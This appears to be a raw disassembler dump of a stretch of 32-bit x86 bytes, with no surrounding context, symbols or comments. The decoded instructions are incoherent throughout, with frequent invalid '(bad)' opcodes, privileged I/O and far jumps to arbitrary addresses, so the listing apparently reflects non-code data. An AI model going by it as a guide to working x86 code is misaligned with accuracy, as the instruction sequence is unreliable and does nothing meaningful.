  411aa0:	cmp    ch,BYTE PTR [ebx]
  411aa2:	adc    ebp,DWORD PTR [esi]
  411aa4:	cdq    
  411aa5:	outs   dx,BYTE PTR ds:[esi]
  411aa6:	neg    DWORD PTR [esi+0x477f6a08]
  411aac:	imul   ecx,esi,0xffffff84
  411aaf:	or     BYTE PTR [ebx-0x1fc79fea],al
  411ab5:	lods   eax,DWORD PTR ds:[esi]
  411ab6:	mov    esi,0xb5233349
  411abb:	inc    esp
  411abc:	retf   
  411abd:	dec    ebx
  411abe:	loope  0x411a68
  411ac0:	cmp    al,0xcd
  411ac2:	jns    0x411a57
  411ac4:	pop    edi
  411ac5:	xchg   ecx,eax
  411ac6:	int3   
  411ac7:	sar    ebp,1
  411ac9:	mov    ecx,cs
  411acb:	(bad)  
  411acd:	icebp  
  411ace:	leave  
  411acf:	ret    
  411ad0:	mov    ds:0x45569773,eax
  411ad5:	sbb    bh,BYTE PTR [ecx+ebx*8+0x4b55aba2]
  411adc:	mov    ds:0x2bf6d616,eax
  411ae1:	mov    ah,0xae
  411ae3:	xchg   ebp,eax
  411ae4:	pop    ebp
  411ae5:	or     dl,BYTE PTR [ebp-0x27]
  411ae8:	shr    BYTE PTR [esi+0x36],0x39
  411aec:	enter  0xc58f,0x60
  411af0:	xor    DWORD PTR [eax+0x8a88196],edx
  411af6:	inc    ebp
  411af7:	sbb    dl,BYTE PTR [edx-0x11e78628]
  411afd:	jmp    0xce8da0c3
  411b02:	outs   dx,DWORD PTR ds:[esi]
  411b03:	cmc    
  411b04:	inc    esi
  411b05:	mov    edi,0xee8b9588
  411b0a:	sub    eax,0xc864fa9f
  411b0f:	arpl   ax,bp
  411b11:	sbb    bh,bl
  411b13:	ins    DWORD PTR es:[edi],dx
  411b14:	in     eax,dx
  411b15:	mov    ds,ebx
  411b17:	dec    edx
  411b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b19:	cmp    eax,0x49d47d04
  411b1e:	bound  ebp,QWORD PTR [edi]
  411b20:	push   eax
  411b21:	cld    
  411b22:	(bad)  
  411b23:	and    DWORD PTR [esi],eax
  411b25:	test   BYTE PTR [esi+0x71450440],cl
  411b2b:	jb     0x411b0c
  411b2d:	pop    ds
  411b2e:	je     0x411ab4
  411b30:	or     ebx,DWORD PTR [edi-0x4ae423bb]
  411b36:	sbb    eax,0xfde37931
  411b3b:	adc    BYTE PTR [ebx],cl
  411b3d:	push   0x135012f9
  411b42:	clc    
  411b43:	retf   0xb1f6
  411b46:	jno    0x411b88
  411b48:	sbb    cl,ah
  411b4a:	inc    ecx
  411b4b:	and    eax,0xc690b78b
  411b50:	call   0xaa09:0xe81d6d39
  411b57:	stos   DWORD PTR es:[edi],eax
  411b58:	mov    bl,0xa
  411b5a:	push   esp
  411b5b:	mov    bh,0xb4
  411b5d:	test   al,0x41
  411b5f:	adc    esi,eax
  411b61:	mov    eax,edx
  411b63:	sub    eax,DWORD PTR [ecx+0x5b270e7f]
  411b69:	dec    edi
  411b6a:	out    0x19,eax
  411b6c:	std    
  411b6d:	xchg   edx,eax
  411b6e:	call   FWORD PTR [ecx+0x7220ade9]
  411b74:	mov    esp,0x9a794360
  411b79:	js     0x411b70
  411b7b:	sti    
  411b7c:	push   eax
  411b7d:	mov    bh,0xa5
  411b7f:	cwde   
  411b80:	outs   dx,DWORD PTR ds:[esi]
  411b81:	mov    eax,0x42623367
  411b86:	dec    ecx
  411b87:	cld    
  411b88:	pop    edx
  411b89:	sbb    DWORD PTR [edx+esi*8-0x64dad25f],edi
  411b90:	mov    BYTE PTR [eax+ecx*4-0x19],al
  411b94:	sahf   
  411b95:	(bad)  
  411b96:	out    0xd4,eax
  411b98:	adc    al,0x51
  411b9a:	jns    0x411c12
  411b9c:	sahf   
  411b9d:	cmp    eax,0x367c208c
  411ba2:	pop    es
  411ba3:	xor    DWORD PTR [esi+edi*8],0xffffffb2
  411ba7:	sub    DWORD PTR [esi+ebx*2-0x6117ac3d],0x52
  411baf:	and    al,0x53
  411bb1:	jo     0x411c28
  411bb3:	ins    BYTE PTR es:[edi],dx
  411bb4:	(bad)  
  411bb5:	sub    DWORD PTR [eax],0x4f
  411bb8:	cdq    
  411bb9:	sbb    eax,0xe53cbfbe
  411bbe:	cmp    al,BYTE PTR [edx+0x51]
  411bc1:	mov    esp,DWORD PTR [edx-0x5832be1d]
  411bc7:	or     bl,BYTE PTR [eax]
  411bc9:	cmp    al,0xca
  411bcb:	pop    edx
  411bcc:	bound  edi,QWORD PTR [ebx+ecx*2+0x75410b99]
  411bd3:	pop    ecx
  411bd4:	aaa    
  411bd5:	inc    ebp
  411bd6:	jmp    0xe269:0xd4fccf30
  411bdd:	add    eax,DWORD PTR [edi]
  411bdf:	jmp    0x3219:0xcacc7b10
  411be6:	dec    ecx
  411be7:	lods   eax,DWORD PTR ds:[esi]
  411be8:	cld    
  411be9:	scas   eax,DWORD PTR es:[edi]
  411bea:	xor    DWORD PTR [esi+0x2c024904],esi
  411bf0:	fwait
  411bf1:	mov    al,ds:0x5e234ae5
  411bf6:	jge    0x411bbb
  411bf8:	pop    ss
  411bf9:	dec    esp
  411bfa:	pusha  
  411bfb:	lock mov al,0x81
  411bfe:	mov    al,0x15
  411c00:	xor    ebx,DWORD PTR [esi-0x3609a901]
  411c06:	int3   
  411c07:	xor    ah,ah
  411c09:	lock ja 0x411c6c
  411c0c:	or     al,0x98
  411c0e:	test   esi,edx
  411c10:	call   0x6203c8d4
  411c15:	loop   0x411c3d
  411c17:	xor    al,0x57
  411c19:	mov    esp,0x988d8e4f
  411c1e:	cmp    esp,DWORD PTR [eax]
  411c20:	(bad)  
  411c22:	(bad)  
  411c23:	ds jmp 0x49d510f2
  411c29:	test   DWORD PTR [eax+0xd361c8f],esp
  411c2f:	sbb    dh,cl
  411c31:	dec    ch
  411c33:	and    BYTE PTR [eax+0x45479f07],dh
  411c39:	hlt    
  411c3a:	jno    0x411bde
  411c3c:	sahf   
  411c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c3e:	inc    ebp
  411c3f:	xor    esp,DWORD PTR [ecx]
  411c41:	int3   
  411c42:	jb     0x411be0
  411c44:	pop    ds
  411c45:	in     al,0x72
  411c47:	cdq    
  411c48:	xor    eax,0x3f0c00bd
  411c4d:	xchg   edi,eax
  411c4e:	retf   0x81cf
  411c51:	push   ebx
  411c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c53:	pop    edx
  411c54:	or     ch,BYTE PTR [ecx+0x50b1d441]
  411c5a:	loopne 0x411c9b
  411c5c:	pop    esp
  411c5d:	div    DWORD PTR [edi]
  411c5f:	push   ecx
  411c60:	push   ebp
  411c61:	jmp    0x8fed29cb
  411c66:	int    0x34
  411c68:	sar    cl,0xa
  411c6b:	fisttp DWORD PTR ds:0x35472cc
  411c71:	sbb    DWORD PTR [ebx],0x1f1f39d4
  411c77:	icebp  
  411c78:	shr    edi,cl
  411c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c7b:	test   eax,0x3fed048b
  411c80:	jno    0x411c1f
  411c82:	inc    ebx
  411c83:	es pop ecx
  411c85:	scas   eax,DWORD PTR es:[edi]
  411c86:	jno    0x411cd3
  411c88:	retf   0x9680
  411c8b:	inc    esi
  411c8c:	(bad)  
  411c8e:	call   0x3760:0x1cfc8e04
  411c95:	hlt    
  411c96:	cld    
  411c97:	mov    bl,0x31
  411c99:	sub    BYTE PTR [ebx],0xa9
  411c9c:	xor    eax,0x10950a85
  411ca1:	dec    esp
  411ca2:	pop    ebx
  411ca3:	or     al,0x23
  411ca5:	jne    0x411c8a
  411ca7:	sub    BYTE PTR [edx],0xca
  411caa:	sub    DWORD PTR [eax],ebx
  411cac:	aas    
  411cad:	retf   0xe4d0
  411cb0:	mov    al,BYTE PTR [edx+0x9]
  411cb3:	js     0x411d0e
  411cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb6:	cmc    
  411cb7:	cmp    esi,DWORD PTR [edx+edi*2]
  411cba:	push   edi
  411cbb:	fisttp QWORD PTR [ecx-0x2cef2b25]
  411cc1:	and    ebx,DWORD PTR [esi]
  411cc3:	js     0x411d37
  411cc5:	add    cl,dh
  411cc7:	pop    ebp
  411cc8:	fs aaa 
  411cca:	(bad)  
  411ccb:	stos   BYTE PTR es:[edi],al
  411ccc:	inc    eax
  411ccd:	xor    eax,0x533b980a
  411cd2:	adc    DWORD PTR [eax],ebx
  411cd4:	idiv   DWORD PTR [ecx-0x21882788]
  411cda:	adc    eax,0x93fd4317
  411cdf:	lea    eax,[eax-0x41]
  411ce2:	outs   dx,DWORD PTR ds:[esi]
  411ce3:	nop
  411ce4:	mov    ch,0x68
  411ce6:	mov    ecx,0xb84dd2d4
  411ceb:	pop    ebp
  411cec:	mov    al,BYTE PTR ds:0x88276a12
  411cf2:	jnp    0x411c98
  411cf4:	mov    WORD PTR [ecx-0x2fadd3df],fs
  411cfa:	stc    
  411cfb:	and    al,0xf
  411cfd:	test   BYTE PTR [ebx+0x6cf8b65e],cl
  411d03:	jecxz  0x411d0d
  411d05:	jae    0x411d08
  411d07:	scas   al,BYTE PTR es:[edi]
  411d08:	in     eax,dx
  411d09:	and    edx,ebp
  411d0b:	(bad)  
  411d0c:	ins    BYTE PTR es:[edi],dx
  411d0d:	les    esp,FWORD PTR [edx-0x1242b36c]
  411d13:	shl    BYTE PTR [edx+0x18],1
  411d16:	jo     0x411d0a
  411d18:	jge    0x411cc5
  411d1a:	pop    edx
  411d1b:	xor    edi,DWORD PTR [esi-0x57]
  411d1e:	mov    dh,0x81
  411d20:	(bad)  
  411d21:	mov    ds:0x58b99ef7,al
  411d26:	les    esp,FWORD PTR [ebx-0x53]
  411d29:	sub    DWORD PTR [edi+0x14],0xffffffb2
  411d2d:	imul   esp,DWORD PTR [edi-0x7f],0x1b
  411d31:	in     al,0xf7
  411d33:	sub    bl,al
  411d35:	neg    DWORD PTR [ecx+0x5]
  411d38:	and    dl,bh
  411d3a:	adc    BYTE PTR [edi+eiz*4+0x29],0x55
  411d3f:	push   0xffffffe5
  411d41:	add    DWORD PTR [esi+0x5eff68bd],esp
  411d47:	in     al,dx
  411d48:	stos   DWORD PTR es:[edi],eax
  411d49:	not    esp
  411d4b:	popf   
  411d4c:	leave  
  411d4d:	mov    ds:0xf796154b,eax
  411d52:	cmp    ah,BYTE PTR [ebp-0x31]
  411d55:	xor    eax,0xeb14d889
  411d5a:	or     al,ch
  411d5c:	mov    dh,0xd6
  411d5e:	cmp    edi,DWORD PTR [edx]
  411d60:	xor    eax,0x5db94bd
  411d65:	mov    ds:0xf36115bf,al
  411d6a:	or     ah,al
  411d6c:	pop    ds
  411d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d6e:	shl    BYTE PTR [ebx+ebx*8+0x683af35e],cl
  411d75:	jmp    0x411d01
  411d77:	dec    ebp
  411d78:	inc    esp
  411d79:	sbb    eax,0x40a00cda
  411d7e:	sbb    al,0xed
  411d80:	retf   0xb84
  411d83:	inc    edx
  411d84:	sub    eax,0x15c0d964
  411d89:	outs   dx,BYTE PTR ds:[esi]
  411d8a:	cmp    eax,0x35b2e749
  411d8f:	lahf   
  411d90:	mov    ebx,0xd5557de4
  411d95:	mov    esp,0x13e7014e
  411d9a:	fnstsw WORD PTR [edx+0x6d4bae91]
  411da0:	ret    0xc23e
  411da3:	cwde   
  411da4:	and    BYTE PTR [eax+eiz*4+0x38],0xf5
  411da9:	test   DWORD PTR [ecx-0x1de72fae],ecx
  411daf:	cs mov edx,0xd85a1096
  411db5:	mov    eax,ds:0x10e41a74
  411dba:	push   esp
  411dbb:	jne    0x411e17
  411dbd:	jecxz  0x411e1c
  411dbf:	mov    edi,ebx
  411dc1:	in     eax,0xba
  411dc3:	dec    edx
  411dc4:	in     al,0xd9
  411dc6:	lea    ebp,[edx-0x46]
  411dc9:	out    dx,eax
  411dca:	xlat   BYTE PTR ds:[ebx]
  411dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dcc:	jns    0x411d8a
  411dce:	xor    dl,BYTE PTR [esi+0x6870ce84]
  411dd4:	cli    
  411dd5:	sbb    ah,dl
  411dd7:	retf   
  411dd8:	sti    
  411dd9:	mov    BYTE PTR gs:[ecx],0xdf
  411ddd:	stos   BYTE PTR es:[edi],al
  411dde:	(bad)  
  411ddf:	mov    DWORD PTR [esi+0x79],edx
  411de2:	aam    0x16
  411de4:	adc    eax,0xfdf9a3cf
  411de9:	jne    0x411e66
  411deb:	daa    
  411dec:	mov    cl,0xd7
  411dee:	jecxz  0x411e15
  411df0:	xor    al,0xff
  411df2:	mov    WORD PTR [ecx],ss
  411df4:	adc    eax,0x77cc8ffe
  411df9:	call   0x732a509f
  411dfe:	test   al,0xd9
  411e00:	fist   WORD PTR [bp+si-0x52]
  411e04:	fistp  WORD PTR [ebx]
  411e06:	push   ds
  411e07:	(bad)  [esi+0x5da33859]
  411e0d:	nop
  411e0e:	mov    ebp,0x3b476b63
  411e13:	and    al,0xc1
  411e15:	fwait
  411e16:	dec    ebp
  411e17:	mov    ah,0x79
  411e19:	push   ecx
  411e1a:	ret    
  411e1b:	pushf  
  411e1c:	cs mov ebp,0x60bf78ab
  411e22:	test   eax,0x77a85b6b
  411e27:	loope  0x411e87
  411e29:	pop    ds
  411e2a:	push   edx
  411e2b:	into   
  411e2c:	mov    edi,DWORD PTR [eax-0x7a]
  411e2f:	(bad)  
  411e30:	cmp    ecx,esi
  411e32:	mov    al,ds:0xa6da6ba8
  411e37:	int    0xeb
  411e39:	mov    ch,0x46
  411e3b:	push   edi
  411e3c:	sbb    bh,0x51
  411e3f:	dec    eax
  411e40:	cwde   
  411e41:	fidiv  WORD PTR ds:[edi]
  411e44:	out    0xc6,al
  411e46:	rcl    BYTE PTR [edx],0x8e
  411e49:	inc    eax
  411e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e4b:	sub    DWORD PTR [esi+edi*2-0x35],edi
  411e4f:	xor    ah,BYTE PTR [ecx]
  411e51:	xchg   edx,eax
  411e52:	call   0x4842:0x23790deb
  411e59:	(bad)  
  411e5a:	imul   esp,DWORD PTR [ebx],0x1cef26e2
  411e60:	imul   ebx,DWORD PTR [ebx-0x1],0xffffffd0
  411e64:	dec    edi
  411e65:	pushf  
  411e66:	push   0x4d
  411e68:	hlt    
  411e69:	dec    edi
  411e6a:	call   0x99661ea7
  411e6f:	and    BYTE PTR [eax],dh
  411e71:	lea    esi,[ecx]
  411e73:	add    edi,eax
  411e75:	(bad)  
  411e76:	je     0x411ef0
  411e78:	and    ebx,0x7b598719
  411e7e:	mov    al,0x0
  411e80:	jle    0x411e9b
  411e82:	mov    eax,ds:0xecadf643
  411e87:	mov    ecx,0x76e90a60
  411e8c:	add    DWORD PTR [edi],ebx
  411e8e:	xor    BYTE PTR [esi+0xe06951e],cl
  411e94:	ins    DWORD PTR es:[edi],dx
  411e95:	sbb    ebp,ebx
  411e97:	nop
  411e98:	pop    ebp
  411e99:	xchg   ebp,eax
  411e9a:	or     eax,0x8650b2c2
  411e9f:	mov    ds:0x46510c90,al
  411ea4:	sbb    al,dl
  411ea6:	and    al,0x44
  411ea8:	aad    0x7b
  411eaa:	lods   al,BYTE PTR ds:[esi]
  411eab:	stos   DWORD PTR es:[edi],eax
  411eac:	jne    0x411eca
  411eae:	(bad)  
  411eaf:	mov    ds:0xfa1ba060,eax
  411eb4:	shl    BYTE PTR [ecx-0x55],1
  411eb7:	shr    BYTE PTR [ecx-0x3dc3a66d],cl
  411ebd:	and    BYTE PTR [edi-0x32e8518d],0xa7
  411ec4:	jmp    0x179cdcb5
  411ec9:	or     DWORD PTR [edx],esi
  411ecb:	rol    BYTE PTR [esi+0x31eff4a1],0xf9
  411ed2:	fild   QWORD PTR [eax-0x3bda4f16]
  411ed8:	arpl   dx,ax
  411eda:	and    dl,BYTE PTR [edx+0x3f6ac646]
  411ee0:	fs call 0x9395:0xf95473a1
  411ee8:	pop    eax
  411ee9:	mov    ebx,0x732adc56
  411eee:	aas    
  411eef:	sbb    edi,esi
  411ef1:	push   ds
  411ef2:	add    DWORD PTR [esi-0x62],ebx
  411ef5:	or     al,0x61
  411ef7:	dec    eax
  411ef8:	push   esp
  411ef9:	dec    esi
  411efa:	cmc    
  411efb:	jae    0x411eda
  411efd:	and    eax,0x35bf4b22
  411f02:	cmp    al,0xf9
  411f04:	cs (bad) 
  411f06:	xchg   ebx,eax
  411f07:	cmc    
  411f08:	mov    ebp,0x22596e73
  411f0d:	pop    ebp
  411f0e:	mov    al,ds:0xa4ce3c52
  411f13:	push   ss
  411f14:	dec    ebx
  411f15:	adc    al,0xa2
  411f17:	out    0xe7,eax
  411f19:	sub    esi,esi
  411f1b:	jo     0x411ef7
  411f1d:	into   
  411f1e:	dec    edx
  411f1f:	sbb    eax,0xfce862b3
  411f24:	push   edx
  411f25:	lods   al,BYTE PTR ds:[esi]
  411f26:	(bad)  
  411f28:	mov    al,ds:0x5b35d51d
  411f2d:	xor    BYTE PTR [ecx],cl
  411f2f:	xchg   BYTE PTR [esi+0x6f55740c],dh
  411f35:	fmul   DWORD PTR [ebx+0x4e]
  411f38:	test   BYTE PTR [edi-0x15e3919f],ah
  411f3e:	(bad)  
  411f3f:	mov    al,ds:0x39ccfc05
  411f44:	ror    DWORD PTR [edx+0x3a916e8a],1
  411f4a:	mov    esi,0x26780d62
  411f4f:	imul   ebp,DWORD PTR [ebp-0xb],0x67
  411f53:	lock and al,0xef
  411f56:	(bad)  
  411f57:	pop    edi
  411f58:	push   0x70
  411f5a:	inc    ebp
  411f5b:	add    al,0x4f
  411f5d:	rcr    BYTE PTR [ebp+0x19],1
  411f60:	dec    esi
  411f61:	push   eax
  411f62:	test   eax,0xd5928684
  411f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f68:	sbb    al,cl
  411f6a:	add    eax,0xd30f4197
  411f6f:	or     BYTE PTR [edx+0x78953eaf],ch
  411f75:	ror    BYTE PTR [esi],1
  411f77:	fsub   QWORD PTR ds:0x7fabaeb9
  411f7d:	bound  ebp,QWORD PTR [ecx-0x3d]
  411f80:	dec    edx
  411f81:	test   DWORD PTR [edi],ebx
  411f83:	mov    ah,0x3c
  411f85:	stc    
  411f86:	or     eax,0x859e3857
  411f8b:	gs dec ecx
  411f8d:	sbb    BYTE PTR [eax],dl
  411f8f:	adc    ecx,ebp
  411f91:	(bad)
  411f94:	test   eax,0x60b2d5a0
  411f99:	mov    ebp,0x919dc70e
  411f9e:	xchg   edx,eax
  411f9f:	adc    dh,BYTE PTR [ebx]
  411fa1:	add    ecx,ecx
  411fa3:	ret    0xd92a
  411fa6:	(bad)  
  411fa7:	icebp  
  411fa8:	pop    DWORD PTR [eax+0x55e391dd]
  411fae:	jecxz  0x41200d
  411fb0:	push   ebp
  411fb1:	lahf   
  411fb2:	in     eax,dx
  411fb3:	pusha  
  411fb4:	pavgw  mm6,mm2
  411fb7:	outs   dx,BYTE PTR ds:[esi]
  411fb8:	pop    ss
  411fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fba:	dec    ebx
  411fbb:	add    cl,BYTE PTR [esi+0x15]
  411fbe:	pop    ecx
  411fbf:	fwait
  411fc0:	leave  
  411fc1:	mov    fs,WORD PTR [edx+ecx*8]
  411fc4:	cmp    dh,bl
  411fc6:	jp     0x411fd8
  411fc8:	loopne 0x411fd1
  411fca:	repnz push ebx
  411fcc:	(bad)  
  411fcd:	fsub   QWORD PTR [ebp-0x47e5e4c3]
  411fd3:	cmp    al,0x14
  411fd5:	cwde   
  411fd6:	out    dx,al
  411fd7:	sub    eax,0x7ce26d01
  411fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fdd:	cwde   
  411fde:	mov    DWORD PTR [ecx+edx*4+0x7d0edd7d],esp
  411fe5:	(bad)  
  411fe6:	not    DWORD PTR ss:[edi]
  411fe9:	std    
  411fea:	fld    TBYTE PTR [esi-0x31]
  411fed:	not    BYTE PTR es:[ecx+0x3b]
  411ff1:	sbb    al,0xc8
  411ff3:	mov    edi,0x10b03ded
  411ff8:	pop    es
  411ff9:	jo     0x411f9b
  411ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ffc:	(bad)  
  411ffd:	dec    edx
  411ffe:	xchg   edx,eax
  411fff:	cwde   
  412000:	cwde   
  412001:	push   cs
  412002:	pop    ds
  412003:	pop    ecx
  412004:	or     dh,BYTE PTR [ebx+0x678eedc2]
  41200a:	mov    ecx,0xcb572381
  41200f:	(bad)  
  412010:	out    0xbc,al
  412012:	leave  
  412013:	es sub cl,ah
  412016:	inc    edi
  412017:	ret    
  412018:	cmc    
  412019:	jmp    0x91bb7bfd
  41201e:	int3   
  41201f:	and    dh,dh
  412021:	mov    bh,0x9f
  412023:	mov    ds:0xf692fad6,al
  412028:	dec    ecx
  412029:	mov    edi,0x26e101a4
  41202e:	add    dl,BYTE PTR [esi+0x2e]
  412031:	jae    0x412076
  412033:	(bad)  
  412034:	shl    BYTE PTR [ecx],cl
  412036:	int    0xd
  412038:	ja     0x41204a
  41203a:	test   eax,esp
  41203c:	cmp    DWORD PTR [ebx],ebx
  41203e:	pop    edx
  41203f:	sbb    BYTE PTR [edx+0x54e829b8],cl
  412045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412047:	lahf   
  412048:	jge    0x411fe5
  41204a:	(bad)  
  41204b:	and    esp,DWORD PTR gs:0xcba5218f
  412052:	es push ebx
  412054:	mov    ebp,0xb82c171f
  412059:	pop    es
  41205a:	dec    edi
  41205b:	sbb    BYTE PTR [ecx-0x67],ah
  41205e:	sub    edi,DWORD PTR [edx-0x58c417cf]
  412064:	int    0xe4
  412066:	jecxz  0x4120b9
  412068:	jmp    0x41200c
  41206a:	mov    esi,0xc8b89c4d
  41206f:	xchg   BYTE PTR [eax+0x2af08679],ch
  412075:	fsub   QWORD PTR [edx]
  412077:	mov    edx,0x9376769e
  41207c:	fwait
  41207d:	scas   eax,DWORD PTR es:[edi]
  41207e:	lahf   
  41207f:	leave  
  412080:	xor    DWORD PTR [ebp+0x7c],eax
  412083:	mov    al,ds:0x1ccd3c1
  412088:	(bad)  
  412089:	sbb    DWORD PTR [eax+0x31],ebp
  41208c:	cwde   
  41208d:	(bad)  
  41208e:	in     eax,dx
  41208f:	and    DWORD PTR [ebx],ebp
  412091:	cmp    ebp,0x24f0b220
  412097:	mov    ds:0xec635ffb,al
  41209c:	aam    0xc5
  41209e:	(bad)  [esi]
  4120a0:	and    DWORD PTR ds:0x90e786f3,edi
  4120a6:	sbb    edx,DWORD PTR [ecx+0x40]
  4120a9:	and    cl,ah
  4120ab:	sub    WORD PTR [edi],0xab1e
  4120b0:	mov    ah,0xfc
  4120b2:	xchg   esi,eax
  4120b3:	popf   
  4120b4:	in     al,dx
  4120b5:	bound  esp,QWORD PTR [ebx-0x3f]
  4120b8:	adc    ch,BYTE PTR [edi]
  4120ba:	inc    edx
  4120bb:	mov    cl,bl
  4120bd:	out    0xf7,al
  4120bf:	shl    DWORD PTR [edx+edx*8+0xf],1
  4120c3:	inc    edi
  4120c4:	bound  eax,QWORD PTR [edi]
  4120c6:	xlat   BYTE PTR ds:[ebx]
  4120c7:	xor    bh,BYTE PTR [ebp-0x6ac1106f]
  4120cd:	shr    ecx,1
  4120cf:	sub    al,0xe9
  4120d1:	ss in  al,dx
  4120d3:	pop    ebp
  4120d4:	bound  eax,QWORD PTR [edx]
  4120d6:	sbb    al,0x8f
  4120d8:	dec    esi
  4120d9:	call   0xfcd364d
  4120de:	adc    BYTE PTR [esi+0x52a8db86],dh
  4120e4:	add    al,0x4
  4120e6:	lods   al,BYTE PTR ds:[esi]
  4120e7:	add    DWORD PTR [ebp-0x131b2f8c],esp
  4120ed:	mov    ds:0x623f0f30,eax
  4120f2:	fmul   QWORD PTR [edx+0x3671b2a4]
  4120f8:	jae    0x412084
  4120fa:	les    eax,FWORD PTR [ebp-0xf]
  4120fd:	mov    ah,al
  4120ff:	dec    eax
  412100:	mov    WORD PTR [edi-0x53],fs
  412103:	shl    BYTE PTR [edi-0x73500525],cl
  412109:	aad    0x70
  41210b:	lahf   
  41210c:	jmp    0x37f347aa
  412111:	gs mov ch,0x2e
  412115:	pop    eax
  412116:	xor    eax,0xf5afa5bf
  41211b:	pop    edi
  41211c:	cmp    eax,0xd077d4b6
  412121:	pushf  
  412122:	repz adc dl,0x6d
  412126:	enter  0x6beb,0x42
  41212a:	dec    ebx
  41212b:	(bad)
  41212e:	imul   edx,DWORD PTR [esi+0x3d6b2a7e],0xfffffff2
  412135:	inc    ecx
  412136:	sbb    eax,0x9b2fa3d1
  41213b:	bound  esp,QWORD PTR [eax]
  41213d:	imul   edi,ebp,0x76
  412140:	in     eax,dx
  412141:	push   ebx
  412142:	mov    dh,0x15
  412144:	mov    al,ds:0x2b66154c
  412149:	dec    ecx
  41214a:	mov    ebx,0x9cbbfa6d
  41214f:	sbb    ch,BYTE PTR [ebx-0x18]
  412152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412153:	js     0x412173
  412155:	xchg   esi,eax
  412156:	cmp    al,0x84
  412158:	and    bl,BYTE PTR gs:[edx-0x4d]
  41215c:	imul   esi,DWORD PTR [ebp+ebp*4+0x4b],0x2
  412161:	scas   eax,DWORD PTR es:[edi]
  412162:	(bad)  
  412163:	fisttp QWORD PTR [ebp+0x9]
  412166:	(bad)  
  412168:	push   esi
  412169:	dec    edx
  41216a:	fsubp  st(1),st
  41216c:	call   0xb827137f
  412171:	out    dx,eax
  412172:	je     0x4120fe
  412174:	test   DWORD PTR [eax-0x608e2bb2],ebp
  41217a:	mov    eax,0x1a812a1b
  41217f:	lahf   
  412180:	cmc    
  412181:	scas   al,BYTE PTR es:[edi]
  412182:	push   edi
  412183:	pop    ecx
  412184:	ds inc esp
  412186:	das    
  412187:	sahf   
  412188:	add    al,BYTE PTR [eax-0x16]
  41218b:	and    dl,bh
  41218d:	jecxz  0x4121cf
  41218f:	das    
  412190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412191:	push   ss
  412192:	loop   0x4121ba
  412194:	or     ax,0xc5e2
  412198:	clc    
  412199:	jl     0x412148
  41219b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41219c:	fild   DWORD PTR [edx+0x33]
  41219f:	rcr    DWORD PTR [edi+ebx*2+0x1d55f1e8],cl
  4121a6:	xor    ebp,esp
  4121a8:	out    dx,eax
  4121a9:	pop    eax
  4121aa:	add    BYTE PTR [esi],ch
  4121ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ad:	or     al,0xf5
  4121af:	jno    0x41221d
  4121b1:	outs   dx,DWORD PTR ds:[esi]
  4121b2:	inc    DWORD PTR [edi+0x4b293b6f]
  4121b8:	call   0xc1a1:0x247ed5a5
  4121bf:	cmp    DWORD PTR [esi],ecx
  4121c1:	test   eax,0xf89dfea7
  4121c6:	out    dx,al
  4121c7:	pop    ebp
  4121c8:	pushf  
  4121c9:	xchg   edi,eax
  4121ca:	ja     0x41221c
  4121cc:	or     DWORD PTR [eax+0x8],ebx
  4121cf:	mov    esp,0x8aa37fb6
  4121d4:	aad    0xa7
  4121d6:	test   cl,al
  4121d8:	dec    ebx
  4121d9:	rcl    BYTE PTR [edi],0xc5
  4121dc:	(bad)  
  4121dd:	ret    0xb4a9
  4121e0:	adc    eax,0x19e86ad2
  4121e5:	lods   al,BYTE PTR ds:[esi]
  4121e6:	sub    DWORD PTR [ecx+0x4f],eax
  4121e9:	ficom  DWORD PTR [eax+0x66945894]
  4121ef:	jmp    0xf720:0x599e07ed
  4121f6:	popf   
  4121f7:	and    ch,dh
  4121f9:	jmp    edi
  4121fb:	retf   0xd729
  4121fe:	pop    eax
  4121ff:	cmp    BYTE PTR [edi],ah
  412201:	jmp    FWORD PTR [edi]
  412203:	lods   eax,DWORD PTR ds:[esi]
  412204:	cmp    BYTE PTR [edi-0x80],0x34
  412208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412209:	in     al,0xb7
  41220b:	lock (bad) 
  41220d:	cmp    ebp,ebx
  41220f:	pcmpgtd mm0,QWORD PTR [esp+edx*1-0x5b9ecb73]
  412217:	(bad)  
  412218:	push   ss
  412219:	add    eax,0x2ddd01c6
  41221e:	xchg   ebp,eax
  41221f:	rcr    esi,0xea
  412222:	fild   DWORD PTR [ebx]
  412224:	sbb    al,BYTE PTR [ecx-0x6c]
  412227:	add    eax,0xee6e32ba
  41222c:	xchg   esp,eax
  41222d:	pop    edi
  41222e:	inc    esi
  41222f:	pusha  
  412230:	xchg   DWORD PTR [ebx+ebp*4],esp
  412233:	outs   dx,DWORD PTR ds:[esi]
  412234:	int3   
  412235:	cmp    ebx,ecx
  412237:	jge    0x41225a
  412239:	pop    ebx
  41223a:	in     al,0x4b
  41223c:	scas   eax,DWORD PTR es:[edi]
  41223d:	sbb    ch,dh
  41223f:	clc    
  412240:	scas   eax,DWORD PTR es:[edi]
  412241:	lods   al,BYTE PTR ds:[esi]
  412242:	or     ecx,0xe6779bf2
  412248:	push   ebp
  412249:	mov    DWORD PTR [eax+edx*1+0x3e],eax
  41224d:	inc    eax
  41224e:	inc    edx
  41224f:	mov    bh,0xfb
  412251:	fdivrp st(2),st
  412253:	pop    ss
  412254:	add    eax,DWORD PTR [ecx-0x5ea3d91f]
  41225a:	xchg   ecx,eax
  41225b:	dec    edx
  41225c:	and    al,0x70
  41225e:	push   esp
